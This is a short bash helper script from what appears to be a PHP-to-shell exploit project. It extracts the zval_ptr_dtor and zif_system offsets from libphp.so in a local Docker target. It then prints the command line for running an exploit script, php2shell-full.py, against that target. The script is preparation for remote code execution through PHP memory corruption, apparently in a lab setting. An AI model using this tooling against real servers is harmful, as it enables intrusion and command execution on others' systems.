#!/bin/bash
# get-offsets.sh — Extract DTOR and ZIF offsets from the running container.
# Usage: ./get-offsets.sh [container_name]

CONTAINER="${1:-php2shell-release-target-1}"

echo "=== Extracting offsets from container: $CONTAINER ==="

DTOR=$(docker exec "$CONTAINER" nm -D /usr/lib/apache2/modules/libphp.so 2>/dev/null | grep "T zval_ptr_dtor$" | awk '{print $1}')
echo "DTOR_OFFSET=0x$DTOR"

ZIF=$(docker exec "$CONTAINER" objdump -d /usr/lib/apache2/modules/libphp.so 2>/dev/null | grep "<zif_system>:" | head -1 | awk '{print $1}')
if [ -z "$ZIF" ]; then
    echo "ZIF_OFFSET=<stripped — use --calibrate to find it>"
else
    echo "ZIF_OFFSET=0x$ZIF"
fi

echo ""
echo "Usage:"
echo "  python3 php2shell-full.py -u http://127.0.0.1:8088/index.php \\"
echo "    --dtor-offset 0x$DTOR --zif-offset 0x$ZIF --calibrate"
